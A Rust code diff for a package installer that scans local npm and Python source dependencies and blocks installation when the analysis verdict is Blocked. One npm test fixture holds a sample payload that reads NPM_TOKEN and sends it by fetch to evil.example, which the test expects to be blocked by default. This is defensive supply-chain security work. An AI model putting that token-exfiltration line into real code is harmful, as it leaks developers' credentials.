@@ -687,6 +687,7 @@ pub struct LinkOptions {
     pub discover_project_requirements: bool,
     pub save_manifest_dependency: bool,
     pub save_dependency_kind: ManifestDependencyKind,
+    pub enforce_local_source_verdicts: bool,
 }
 
 impl LinkOptions {
@@ -738,6 +739,7 @@ impl LinkOptions {
             discover_project_requirements: true,
             save_manifest_dependency: true,
             save_dependency_kind: ManifestDependencyKind::Production,
+            enforce_local_source_verdicts: true,
         }
     }
 }
@@ -827,6 +829,7 @@ pub struct LinkReport {
 pub struct InstallReport {
     pub npm_packages: usize,
     pub pypi_packages: usize,
+    pub local_source_artifacts: usize,
     pub npm_bins: usize,
     pub python_scripts: usize,
     pub node_modules: PathBuf,
@@ -1366,6 +1369,7 @@ pub fn install_project(options: &LinkOptions) -> Result<InstallReport> {
     let mut options = options.clone();
     lock_project_options(&mut options)?;
     let lock = read_lockfile(options.project_dir.join(LOCKFILE))?;
+    let local_source_artifacts = compile_local_source_artifacts(&options)?;
     let mut report = install_lock_with_python_target(
         &options.project_dir,
         &lock,
@@ -1373,6 +1377,7 @@ pub fn install_project(options: &LinkOptions) -> Result<InstallReport> {
         options.python_bin_dir.as_deref(),
         options.python_target_overwrite_existing,
     )?;
+    report.local_source_artifacts += local_source_artifacts;
     report.npm_bins += install_npm_project_links(
         &options.project_dir,
         &report.node_modules,
@@ -1432,6 +1437,7 @@ pub fn install_locked_project(options: &LinkOptions) -> Result<InstallReport> {
     selected
         .packages
         .retain(|package| retained.contains(&locked_package_key(package)));
+    let local_source_artifacts = compile_local_source_artifacts(&options)?;
 
     let mut report = install_lock_with_python_target(
         &options.project_dir,
@@ -1440,6 +1446,7 @@ pub fn install_locked_project(options: &LinkOptions) -> Result<InstallReport> {
         options.python_bin_dir.as_deref(),
         options.python_target_overwrite_existing,
     )?;
+    report.local_source_artifacts += local_source_artifacts;
     report.npm_bins += install_npm_project_links(
         &options.project_dir,
         &report.node_modules,
@@ -1468,6 +1475,272 @@ fn python_install_local_paths(options: &LinkOptions) -> Vec<PathBuf> {
             .map(|requirement| requirement.path.clone()),
     );
     paths
+}
+
+#[derive(Debug, Clone)]
+struct LocalSourceCompileInput {
+    ecosystem: Ecosystem,
+    source_path: PathBuf,
+    name: String,
+    version: String,
+}
+
+fn compile_local_source_artifacts(options: &LinkOptions) -> Result<usize> {
+    let mut inputs = npm_local_source_compile_inputs(
+        &options.project_dir,
+        &options.npm_local_paths,
+        DependencySelection::from_options(options),
+    )?;
+    inputs.extend(python_local_source_compile_inputs(
+        &python_install_local_paths(options),
+    )?);
+
+    let mut count = 0;
+    let mut seen = BTreeSet::new();
+    for input in inputs {
+        let key = format!(
+            "{}:{}@{}:{}",
+            input.ecosystem,
+            input.name,
+            input.version,
+            input.source_path.display()
+        );
+        if !seen.insert(key) {
+            continue;
+        }
+
+        let report = compile_source_path(CompileSourceOptions {
+            project_dir: options.project_dir.clone(),
+            source_path: input.source_path.clone(),
+            ecosystem: input.ecosystem,
+            name: input.name.clone(),
+            version: input.version.clone(),
+            allowed_capabilities: options.allowed_capabilities.clone(),
+            allowed_flows: options.allowed_flows.clone(),
+            write_artifact: true,
+        })?;
+        if report.artifact.verdict == Verdict::Blocked
+            && options.enforce_local_source_verdicts
+            && !options.record_blocked
+        {
+            return Err(OmcRegistryError::BlockedPackage {
+                spec: format!(
+                    "{}:{}@{} local source `{}`",
+                    input.ecosystem,
+                    input.name,
+                    input.version,
+                    input.source_path.display()
+                ),
+            });
+        }
+        count += 1;
+    }
+
+    Ok(count)
+}
+
+fn npm_local_source_compile_inputs(
+    project_dir: &Path,
+    direct_paths: &[PathBuf],
+    selection: DependencySelection,
+) -> Result<Vec<LocalSourceCompileInput>> {
+    let mut inputs = Vec::new();
+    for path in direct_paths {
+        push_npm_local_source_compile_input(&mut inputs, path, None)?;
+    }
+
+    let package_json = project_dir.join("package.json");
+    if package_json.exists() {
+        let root = serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(&package_json)?)?;
+        if let Some(workspaces) = root.workspaces {
+            for package_json in workspace_package_json_paths(project_dir, &workspaces) {
+                if let Some(package_dir) = package_json.parent() {
+                    push_npm_local_source_compile_input(&mut inputs, package_dir, None)?;
+                }
+            }
+        }
+    }
+
+    for package_json in npm_project_package_jsons(project_dir)? {
+        let base_dir = package_json.parent().unwrap_or(project_dir);
+        let package =
+            serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(&package_json)?)?;
+        let mut links = Vec::new();
+        collect_npm_local_dependency_links(&package, selection, base_dir, &mut links)?;
+        for link in links {
+            push_npm_local_source_compile_input(&mut inputs, &link.path, Some(&link.name))?;
+        }
+    }
+
+    Ok(inputs)
+}
+
+fn push_npm_local_source_compile_input(
+    inputs: &mut Vec<LocalSourceCompileInput>,
+    path: &Path,
+    install_name: Option<&str>,
+) -> Result<()> {
+    let source_path = fs::canonicalize(path).map_err(|error| {
+        OmcRegistryError::UnsupportedRequirement(format!(
+            "local npm path `{}` could not be resolved: {error}",
+            path.display()
+        ))
+    })?;
+    if !source_path.is_dir() {
+        return Err(OmcRegistryError::UnsupportedSpec(format!(
+            "local npm path `{}` must point to an existing directory",
+            source_path.display()
+        )));
+    }
+    let package_json = source_path.join("package.json");
+    if !package_json.exists() {
+        return Err(OmcRegistryError::UnsupportedSpec(format!(
+            "local npm path `{}` must contain package.json",
+            source_path.display()
+        )));
+    }
+    let package = serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(&package_json)?)?;
+    let name = install_name
+        .map(str::to_owned)
+        .or(package.name)
+        .filter(|name| !name.trim().is_empty())
+        .ok_or_else(|| {
+            OmcRegistryError::UnsupportedSpec(format!(
+                "local npm path `{}` package.json must declare name",
+                source_path.display()
+            ))
+        })?;
+    let version = package
+        .version
+        .filter(|version| !version.trim().is_empty())
+        .unwrap_or_else(|| "0.0.0".to_owned());
+
+    inputs.push(LocalSourceCompileInput {
+        ecosystem: Ecosystem::Npm,
+        source_path,
+        name,
+        version,
+    });
+    Ok(())
+}
+
+fn python_local_source_compile_inputs(
+    local_paths: &[PathBuf],
+) -> Result<Vec<LocalSourceCompileInput>> {
+    let mut inputs = Vec::new();
+    for path in local_paths {
+        let source_path = fs::canonicalize(path).map_err(|error| {
+            OmcRegistryError::UnsupportedRequirement(format!(
+                "editable path `{}` could not be resolved: {error}",
+                path.display()
+            ))
+        })?;
+        if !source_path.is_dir() {
+            return Err(OmcRegistryError::UnsupportedRequirement(format!(
+                "editable path `{}` must be a directory",
+                source_path.display()
+            )));
+        }
+        let (name, version) = python_local_source_name_version(&source_path)?;
+        inputs.push(LocalSourceCompileInput {
+            ecosystem: Ecosystem::Pypi,
+            source_path,
+            name,
+            version,
+        });
+    }
+    Ok(inputs)
+}
+
+fn python_local_source_name_version(package_dir: &Path) -> Result<(String, String)> {
+    if let Some((name, version)) = python_local_pyproject_name_version(package_dir)? {
+        return Ok((name, version));
+    }
+    if let Some((name, version)) = python_local_setup_cfg_name_version(package_dir)? {
+        return Ok((name, version));
+    }
+    if let Some((name, version)) = python_local_setup_py_name_version(package_dir)? {
+        return Ok((name, version));
+    }
+
+    let name = package_dir
+        .file_name()
+        .and_then(|name| name.to_str())
+        .map(normalize_pypi_name)
+        .filter(|name| !name.is_empty())
+        .unwrap_or_else(|| "local-source".to_owned());
+    Ok((name, "0.0.0".to_owned()))
+}
+
+fn python_local_pyproject_name_version(package_dir: &Path) -> Result<Option<(String, String)>> {
+    let pyproject = package_dir.join("pyproject.toml");
+    if !pyproject.exists() {
+        return Ok(None);
+    }
+    let pyproject = toml::from_str::<PyProjectToml>(&fs::read_to_string(pyproject)?)?;
+    if let Some(project) = pyproject.project {
+        if let Some(name) = project.name.filter(|name| !name.trim().is_empty()) {
+            let version = project
+                .version
+                .filter(|version| !version.trim().is_empty())
+                .unwrap_or_else(|| "0.0.0".to_owned());
+            return Ok(Some((normalize_pypi_name(&name), version)));
+        }
+    }
+    if let Some(poetry) = pyproject.tool.and_then(|tool| tool.poetry) {
+        if let Some(name) = poetry.name.filter(|name| !name.trim().is_empty()) {
+            let version = poetry
+                .version
+                .filter(|version| !version.trim().is_empty())
+                .unwrap_or_else(|| "0.0.0".to_owned());
+            return Ok(Some((normalize_pypi_name(&name), version)));
+        }
+    }
+    Ok(None)
+}
+
+fn python_local_setup_cfg_name_version(package_dir: &Path) -> Result<Option<(String, String)>> {
+    let setup_cfg = package_dir.join("setup.cfg");
+    if !setup_cfg.exists() {
+        return Ok(None);
+    }
+    let sections = parse_setup_cfg_sections(&fs::read_to_string(setup_cfg)?);
+    let Some(metadata) = sections.get("metadata") else {
+        return Ok(None);
+    };
+    let Some(name) = metadata
+        .get("name")
+        .and_then(|values| values.iter().find(|value| !value.trim().is_empty()))
+    else {
+        return Ok(None);
+    };
+    let version = metadata
+        .get("version")
+        .and_then(|values| values.iter().find(|value| !value.trim().is_empty()))
+        .cloned()
+        .unwrap_or_else(|| "0.0.0".to_owned());
+    Ok(Some((normalize_pypi_name(name), version)))
+}
+
+fn python_local_setup_py_name_version(package_dir: &Path) -> Result<Option<(String, String)>> {
+    let setup_py = package_dir.join("setup.py");
+    if !setup_py.exists() {
+        return Ok(None);
+    }
+    let content = fs::read_to_string(setup_py)?;
+    let name = python_keyword_assignment_values(&content, "name")
+        .into_iter()
+        .flat_map(python_string_literals)
+        .find(|value| !value.trim().is_empty());
+    let Some(name) = name else {
+        return Ok(None);
+    };
+    let version = python_keyword_assignment_values(&content, "version")
+        .into_iter()
+        .flat_map(python_string_literals)
+        .find(|value| !value.trim().is_empty())
+        .unwrap_or_else(|| "0.0.0".to_owned());
+    Ok(Some((normalize_pypi_name(&name), version)))
 }
 
 fn project_requested_specs(options: &mut LinkOptions, locked: bool) -> Result<Vec<PackageSpec>> {
@@ -7145,6 +7418,7 @@ fn install_lock_with_python_target(
     let mut report = InstallReport {
         npm_packages: 0,
         pypi_packages: 0,
+        local_source_artifacts: 0,
         npm_bins: 0,
         python_scripts: 0,
         node_modules,
@@ -17357,6 +17631,8 @@ struct ProjectPackageJson {
     #[serde(default)]
     name: Option<String>,
     #[serde(default)]
+    version: Option<String>,
+    #[serde(default)]
     scripts: BTreeMap<String, String>,
     #[serde(default)]
     workspaces: Option<ProjectWorkspaces>,
@@ -17487,6 +17763,7 @@ struct PyProjectToml {
 #[derive(Debug, Deserialize)]
 struct PyProjectProject {
     name: Option<String>,
+    version: Option<String>,
     #[serde(default)]
     dependencies: Vec<String>,
     #[serde(default, rename = "optional-dependencies")]
@@ -17544,6 +17821,7 @@ struct UvWorkspace {
 #[derive(Debug, Default, Deserialize)]
 struct PoetryProject {
     name: Option<String>,
+    version: Option<String>,
     #[serde(default)]
     dependencies: BTreeMap<String, PoetryDependency>,
     #[serde(default, rename = "dev-dependencies")]
@@ -18690,6 +18968,62 @@ mod tests {
     }
 
     #[test]
+    fn install_project_compiles_npm_local_source_artifacts_before_linking() {
+        let dir = tempfile::tempdir().unwrap();
+        let local = dir.path().join("vendor/local-pkg");
+        fs::create_dir_all(&local).unwrap();
+        fs::write(
+            dir.path().join("package.json"),
+            r#"{
+                "name": "local-source-root",
+                "dependencies": { "local-pkg": "file:vendor/local-pkg" }
+            }"#,
+        )
+        .unwrap();
+        fs::write(
+            local.join("package.json"),
+            r#"{ "name": "local-pkg", "version": "1.2.3" }"#,
+        )
+        .unwrap();
+        fs::write(
+            local.join("index.js"),
+            "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/upload', { body: token });\n",
+        )
+        .unwrap();
+
+        let error = install_project(&LinkOptions::new(dir.path())).unwrap_err();
+        assert!(error
+            .to_string()
+            .contains("blocked package `npm:local-pkg@1.2.3 local source"));
+        assert!(!dir.path().join("node_modules/local-pkg").exists());
+
+        let mut options = LinkOptions::new(dir.path());
+        options.allowed_capabilities = vec![
+            Capability::EnvRead("NPM_TOKEN".to_owned()),
+            Capability::HttpHost("evil.example".to_owned()),
+        ];
+        options
+            .allowed_flows
+            .push(parse_flow_rule("env:NPM_TOKEN->network:evil.example").unwrap());
+        let report = install_project(&options).unwrap();
+
+        assert_eq!(report.local_source_artifacts, 1);
+        assert!(dir.path().join("node_modules/local-pkg").exists());
+        let artifact_path = dir
+            .path()
+            .join(".omc/artifacts/npm/local-pkg/1.2.3/omc.json");
+        let artifact: OmcArtifact =
+            serde_json::from_str(&fs::read_to_string(artifact_path).unwrap()).unwrap();
+        verify_artifact_signature(&artifact).unwrap();
+        assert_eq!(artifact.package.name, "local-pkg");
+        assert_eq!(artifact.package.version, "1.2.3");
+        assert_eq!(artifact.verdict, Verdict::Accepted);
+        assert!(artifact.capabilities.iter().any(|finding| {
+            finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"
+        }));
+    }
+
+    #[test]
     fn installs_manifest_npm_local_paths() {
         let dir = tempfile::tempdir().unwrap();
         fs::create_dir_all(dir.path().join("vendor/direct-pkg")).unwrap();
@@ -18853,6 +19187,51 @@ mod tests {
         assert_eq!(manifest.npm_dev_local_paths, vec!["vendor/optional-pkg"]);
         assert!(manifest.npm_optional_local_paths.is_empty());
         assert_eq!(manifest.npm_peer_local_paths, vec!["vendor/peer-pkg"]);
+    }
+
+    #[test]
+    fn install_project_compiles_python_local_source_artifacts() {
+        let dir = tempfile::tempdir().unwrap();
+        let local = dir.path().join("vendor/local-py");
+        let src = local.join("src/local_py");
+        fs::create_dir_all(&src).unwrap();
+        fs::write(
+            dir.path().join("requirements.txt"),
+            "-e ./vendor/local-py\n",
+        )
+        .unwrap();
+        fs::write(
+            local.join("pyproject.toml"),
+            r#"[project]
+name = "Local_Py"
+version = "0.2.0"
+"#,
+        )
+        .unwrap();
+        fs::write(src.join("__init__.py"), "VALUE = 'local'\n").unwrap();
+
+        let report = install_project(&LinkOptions::new(dir.path())).unwrap();
+
+        assert_eq!(report.pypi_packages, 0);
+        assert_eq!(report.local_source_artifacts, 1);
+        let local_paths =
+            fs::read_to_string(dir.path().join(".omc").join("python").join("local-paths")).unwrap();
+        assert_eq!(
+            local_paths.trim(),
+            fs::canonicalize(local.join("src"))
+                .unwrap()
+                .to_string_lossy()
+        );
+        let artifact_path = dir
+            .path()
+            .join(".omc/artifacts/pypi/local-py/0.2.0/omc.json");
+        let artifact: OmcArtifact =
+            serde_json::from_str(&fs::read_to_string(artifact_path).unwrap()).unwrap();
+        verify_artifact_signature(&artifact).unwrap();
+        assert_eq!(artifact.package.ecosystem, Ecosystem::Pypi);
+        assert_eq!(artifact.package.name, "local-py");
+        assert_eq!(artifact.package.version, "0.2.0");
+        assert_eq!(artifact.verdict, Verdict::Accepted);
     }
 
     #[test]
